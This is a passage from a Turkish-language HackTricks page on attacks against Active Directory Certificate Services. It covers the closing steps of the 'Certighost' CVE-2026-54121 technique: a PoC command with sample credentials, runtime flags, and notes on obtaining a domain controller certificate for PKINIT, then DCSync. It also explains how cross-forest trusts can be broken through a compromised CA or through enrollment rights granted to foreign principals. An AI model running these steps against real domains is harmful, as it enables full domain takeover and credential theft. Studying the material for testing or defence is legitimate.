4. CA'nın controlled machine account olarak rogue listeners'a authenticate olmasına izin verin; ancak identity lookup yanıtlarında **target DC** attributes değerlerini döndürün.
5. CA-signed bir **DC certificate** alın, ardından bunu **PKINIT** için kullanın.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
PoC'deki kullanışlı runtime flag'leri:

- `--listener <ip>`: `cdc` içinde duyurulan callback IP'sini açıkça seçer
- `--computer-name <NAME$>`: yeni bir makine hesabı oluşturmak yerine mevcut bir makine hesabını yeniden kullanır

**Operasyonel notlar:**

- PoC, **root** gerektirir; çünkü **privileged ports** olan `389` ve `445` üzerinde bind işlemi gerçekleştirir.
- Başarılı exploitation sonucunda yerel olarak bir **DC `.pfx`** ve **Kerberos `.ccache`** yazılır.
- Sertifika bir **Domain Controller hesabına** eşlendiğinden, sonraki işlemler arasında **certificate-based Kerberos auth**, **DCSync** ve kurtarılan **machine NT hash**'in yeniden kullanılması bulunabilir.

## Certificates ile Forest'ların Compromise Edilmesi: Passive Voice ile Açıklama

### Compromised CA'ler ile Forest Trust'ların Kırılması

**Cross-forest enrollment** yapılandırması nispeten kolaylaştırılır. Resource forest'taki **root CA certificate**, yöneticiler tarafından **account forest'lara publish edilir** ve resource forest'taki **enterprise CA** sertifikaları, her account forest'taki `NTAuthCertificates` ve AIA container'larına **eklenir**. Açıklamak gerekirse, bu düzenleme resource forest'taki **CA'ye**, PKI'yi yönettiği diğer tüm forest'lar üzerinde tam kontrol sağlar. Bu CA'nın **attackers tarafından compromise edilmesi** durumunda, hem resource hem de account forest'lardaki tüm kullanıcılar için sertifikalar **onlar tarafından forge edilebilir** ve böylece forest'ın security boundary'si kırılabilir.

### Foreign Principals'a Verilen Enrollment Privileges

Multi-forest ortamlarda, **Authenticated Users veya foreign principals**'a (Enterprise CA'nin ait olduğu forest dışındaki kullanıcılar/gruplar) **enrollment ve edit hakları** tanıyan **certificate template'leri publish eden** Enterprise CA'ler konusunda dikkatli olunmalıdır.\
Bir trust üzerinden authentication gerçekleştirildiğinde, **Authenticated Users SID'si** AD tarafından kullanıcının token'ına eklenir. Bu nedenle, bir domain **Authenticated Users'a enrollment rights tanıyan** bir template'e sahip bir Enterprise CA içeriyorsa, template'in **farklı bir forest'tan gelen bir kullanıcı tarafından enroll edilmesi** potansiyel olarak mümkün olabilir. Benzer şekilde, **enrollment rights bir template aracılığıyla foreign principal'a açıkça verildiğinde**, bir forest'taki principal'ın **başka bir forest'taki template'e enroll olmasını** sağlayan bir **cross-forest access-control relationship** oluşturulmuş olur.

Her iki senaryo da bir forest'tan diğerine **attack surface'ün artmasına** yol açar. Certificate template'in ayarları, bir foreign domain'de ek privileges elde etmek için attacker tarafından exploit edilebilir.


## Referanslar

- [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [H0j3n - Certighost technical analysis](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
